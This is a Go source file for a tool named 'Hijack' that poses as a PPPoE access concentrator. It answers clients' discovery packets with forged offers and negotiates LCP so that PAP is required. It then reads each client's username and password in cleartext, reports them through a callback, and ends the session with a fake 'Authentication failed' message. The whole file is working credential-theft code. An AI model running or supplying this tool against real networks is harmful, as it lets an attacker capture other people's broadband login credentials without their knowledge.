package pppoe

import (
	"bytes"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"time"
)

type hijack struct {
	source   net.HardwareAddr
	handle   *pcap.Handle
	callback func(*PAPCredentials)
}

func Hijack(device string, callback func(*PAPCredentials)) (err error) {
	ppp := new(hijack)
	ppp.callback = callback
	ppp.handle, err = pcap.OpenLive(device, 1024, true, time.Second*2)
	if err != nil {
		return
	}
	defer ppp.handle.Close()
	{
		ifc, _ := net.InterfaceByName(device)
		ppp.source = ifc.HardwareAddr
	}
	source := gopacket.NewPacketSource(ppp.handle, ppp.handle.LinkType())
	for packet := range source.Packets() {
		switch layer := packet.Layer(layers.LayerTypeEthernet).(type) {
		case *layers.Ethernet:
			switch layer.EthernetType {
			case layers.EthernetTypePPPoEDiscovery:
				go ppp.onDiscovery(layer)
			case layers.EthernetTypePPPoESession:
				go ppp.onSession(layer)
			}
		}
	}
	return
}

func (ppp *hijack) onDiscovery(packet *layers.Ethernet) {
	raw := gopacket.NewPacket(packet.Payload, layers.LayerTypePPPoE, gopacket.NoCopy)
	switch p := raw.Layer(layers.LayerTypePPPoE).(*layers.PPPoE); p.Code {
	case layers.PPPoECodePADI:
		ppp.onPADI(packet.SrcMAC, p)
	case layers.PPPoECodePADR:
		ppp.onPADR(packet.SrcMAC, p)
	}
}

func (ppp *hijack) onSession(ethernetPacket *layers.Ethernet) {
	pppoePacketRaw := gopacket.NewPacket(ethernetPacket.Payload, layers.LayerTypePPPoE, gopacket.NoCopy)
	pppoePacket := pppoePacketRaw.Layer(layers.LayerTypePPPoE).(*layers.PPPoE)
	pppPacketRaw := gopacket.NewPacket(pppoePacket.Payload, layers.LayerTypePPP, gopacket.NoCopy)
	switch pppPacket := pppPacketRaw.Layer(layers.LayerTypePPP).(*layers.PPP); pppPacket.PPPType {
	case 0xc021:
		ppp.onLCP(ethernetPacket.SrcMAC, pppoePacket, pppPacket.Payload[0])
	case 0xc023:
		ppp.onPAP(ethernetPacket.SrcMAC, pppoePacket)
	}
}

func (ppp *hijack) onPADI(remoteMAC net.HardwareAddr, pppoePacket *layers.PPPoE) {
	var payload bytes.Buffer
	payload.Write([]byte("\x01\x02\x00\x04\x5a\x48\x4c\x48\x01\x01\x00\x00"))
	payload.Write([]byte("\x01\x04\x00\x14\xa3\x57\x32\x90\xbf\xfd\x57\x2e"))
	payload.Write([]byte("\xe6\x9b\xf0\xc7\x8f\x51\xe1\x26\x96\x1a\x00\x00"))
	payload.Write(getHostUniq(pppoePacket.Payload))
	ppp.sendPacket(remoteMAC, payload.Bytes(), layers.PPPoECodePADO, pppoePacket.SessionId, layers.EthernetTypePPPoEDiscovery)
}

func (ppp *hijack) onPADR(remoteMAC net.HardwareAddr, pppoePacket *layers.PPPoE) {
	var payload bytes.Buffer
	payload.Write([]byte("\x01\x01\x00\x00"))
	payload.Write(getHostUniq(pppoePacket.Payload))
	ppp.sendPacket(remoteMAC, payload.Bytes(), layers.PPPoECodePADS, sessionID, layers.EthernetTypePPPoEDiscovery)
}

func (ppp *hijack) onLCP(remoteMAC net.HardwareAddr, pppoePacket *layers.PPPoE, Code byte) {
	switch Code {
	case 0x01: // Configuration Request
		ppp.onConfigurationRequest(remoteMAC, pppoePacket)
	case 0x02: // Configuration ACK
		return
	}
}

func (ppp *hijack) onConfigurationRequest(remoteMAC net.HardwareAddr, pppoePacket *layers.PPPoE) {
	ppp.sendSessionPacket(remoteMAC, []byte("\xc0\x21\x01\x01\x00\x12\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06\xb9\xa2\x7f\x69"))
	configurationACKPayload := pppoePacket.Payload
	configurationACKPayload[2] = 2 // Change LCP Code
	ppp.sendSessionPacket(remoteMAC, configurationACKPayload)
}

func (ppp *hijack) onPAP(remoteMAC net.HardwareAddr, pppoePacket *layers.PPPoE) {
	idLength := pppoePacket.Payload[6]
	passwordLength := pppoePacket.Payload[7+idLength]
	ppp.callback(&PAPCredentials{
		PeerID:     string(pppoePacket.Payload[7 : 7+idLength]),
		Password:   string(pppoePacket.Payload[7+idLength+1 : 7+idLength+1+passwordLength]),
		MACAddress: remoteMAC,
		Timestamp:  time.Now(),
	})
	ppp.terminationRequest(remoteMAC)
}

func (ppp *hijack) terminationRequest(remoteMAC net.HardwareAddr) {
	var payload bytes.Buffer
	payload.Write([]byte("\xc0\x21\x05\x02\x00\x19Authentication failed"))
	ppp.sendSessionPacket(remoteMAC, payload.Bytes())
}

func (ppp *hijack) sendSessionPacket(remoteMAC net.HardwareAddr, payload []byte) {
	ppp.sendPacket(remoteMAC, payload, layers.PPPoECodeSession, sessionID, layers.EthernetTypePPPoESession)
}

func (ppp *hijack) sendPacket(
	remoteMAC net.HardwareAddr,
	payload []byte,
	code layers.PPPoECode,
	sessionId uint16,
	protocol layers.EthernetType,
) {
	buffer := gopacket.NewSerializeBuffer()
	var options gopacket.SerializeOptions
	_ = gopacket.SerializeLayers(
		buffer, options,
		&layers.Ethernet{SrcMAC: ppp.source, DstMAC: remoteMAC, EthernetType: protocol},
		&layers.PPPoE{Version: 1, Type: 1, Code: code, SessionId: sessionId, Length: uint16(len(payload))},
		gopacket.Payload(payload),
	)
	_ = ppp.handle.WritePacketData(buffer.Bytes())
}
